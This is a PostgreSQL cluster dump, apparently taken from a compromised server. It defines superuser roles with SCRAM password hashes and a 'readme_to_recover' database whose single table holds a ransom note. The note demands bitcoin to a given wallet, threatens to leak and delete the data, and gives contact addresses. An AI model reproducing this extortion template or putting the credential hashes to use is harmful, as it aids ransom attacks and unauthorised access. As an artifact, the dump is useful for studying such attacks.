--
-- PostgreSQL database cluster dump
--

\restrict T0bwUcH3PFmUvv0vOqAMWAGdeEM0CTgz2CIE3hxed8Vzzq4zPirHdmdtDE74EJU

SET default_transaction_read_only = off;

SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;

--
-- Roles
--

CREATE ROLE anon;
ALTER ROLE anon WITH NOSUPERUSER INHERIT NOCREATEROLE NOCREATEDB NOLOGIN NOREPLICATION NOBYPASSRLS;
CREATE ROLE authenticated;
ALTER ROLE authenticated WITH NOSUPERUSER INHERIT NOCREATEROLE NOCREATEDB NOLOGIN NOREPLICATION NOBYPASSRLS;
CREATE ROLE pgg_superadmins;
ALTER ROLE pgg_superadmins WITH SUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:ca1uRNz+jgqiK+VoDX2Q+A==$UEnDLPN13+lUlRlw0+Ppo+biUuuzG2vqhcxkmA9u7bc=:fgk+vstHcjEYhV1IKM57OV+9QwMh16ZOUpXQyd8Vsp4=';
CREATE ROLE postgres;
ALTER ROLE postgres WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN REPLICATION BYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:1JWS45+zzebEuZ9a8joLbw==$pSYt/BklD7bM1lIMvKd7j8Wh4G40VvGW91IOyN1yYv8=:WIB7MS7f2zjb4E3KObjidigwSRJUwv1D8ibLbyDLwxs=';
CREATE ROLE service_role;
ALTER ROLE service_role WITH NOSUPERUSER INHERIT NOCREATEROLE NOCREATEDB NOLOGIN NOREPLICATION NOBYPASSRLS;
CREATE ROLE so;
ALTER ROLE so WITH SUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:0T9C8iMBUg8KV/fTgElVVA==$xKxncVb6HTfYzrT/RkaqiPKUO51DuvfLAcdEpUio148=:N6KvRYeZX11lB2Sq5y7XlOFYmzC7hryiD/PMuafzxoY=';

--
-- User Configurations
--








\unrestrict T0bwUcH3PFmUvv0vOqAMWAGdeEM0CTgz2CIE3hxed8Vzzq4zPirHdmdtDE74EJU

--
-- Databases
--

--
-- Database "template1" dump
--

\connect template1

--
-- PostgreSQL database dump
--

\restrict mGdbrhEYPazgTSOodd6x6nBMsYfapCBgcE0aijZVQmizlEw12YR8arf9JvycHIm

-- Dumped from database version 16.10 (Debian 16.10-1.pgdg12+1)
-- Dumped by pg_dump version 16.10 (Debian 16.10-1.pgdg12+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict mGdbrhEYPazgTSOodd6x6nBMsYfapCBgcE0aijZVQmizlEw12YR8arf9JvycHIm

--
-- Database "postgres" dump
--

\connect postgres

--
-- PostgreSQL database dump
--

\restrict Ay3mGKobpn3zkSjdwYxI7hhZ72rIWIIXhSgks8PnrLEQb33BN1wjSWvRr5D4dES

-- Dumped from database version 16.10 (Debian 16.10-1.pgdg12+1)
-- Dumped by pg_dump version 16.10 (Debian 16.10-1.pgdg12+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict Ay3mGKobpn3zkSjdwYxI7hhZ72rIWIIXhSgks8PnrLEQb33BN1wjSWvRr5D4dES

--
-- Database "readme_to_recover" dump
--

--
-- PostgreSQL database dump
--

\restrict WUGBBOKSpebtKYQ9UCfMheb9pRMjLdmO9JPNrYPNJgTt8JGPnVUk72d4NgC1hvm

-- Dumped from database version 16.10 (Debian 16.10-1.pgdg12+1)
-- Dumped by pg_dump version 16.10 (Debian 16.10-1.pgdg12+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: readme_to_recover; Type: DATABASE; Schema: -; Owner: postgres
--

CREATE DATABASE readme_to_recover WITH TEMPLATE = template0 ENCODING = 'UTF8' LOCALE_PROVIDER = libc LOCALE = 'en_US.utf8';


ALTER DATABASE readme_to_recover OWNER TO postgres;

\unrestrict WUGBBOKSpebtKYQ9UCfMheb9pRMjLdmO9JPNrYPNJgTt8JGPnVUk72d4NgC1hvm
\connect readme_to_recover
\restrict WUGBBOKSpebtKYQ9UCfMheb9pRMjLdmO9JPNrYPNJgTt8JGPnVUk72d4NgC1hvm

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: readme; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.readme (
    text_field character varying(255)
);


ALTER TABLE public.readme OWNER TO postgres;

--
-- Data for Name: readme; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.readme (text_field) FROM stdin;
All your data is backed up. You must pay 0.0041 BTC to bc1qw6prfr353l425385kfvryv69fu8we0stw4jw3x In 48 hours, your data will be publicly disclosed and deleted. (more information: go to http://2info.win/psg)
After paying send mail to us: rambler+3dcec@onionmail.org and we will provide a link for you to download your data. Your DBCODE is: 3DCEC
\.


--
-- PostgreSQL database dump complete
--

\unrestrict WUGBBOKSpebtKYQ9UCfMheb9pRMjLdmO9JPNrYPNJgTt8JGPnVUk72d4NgC1hvm

--
-- PostgreSQL database cluster dump complete
--

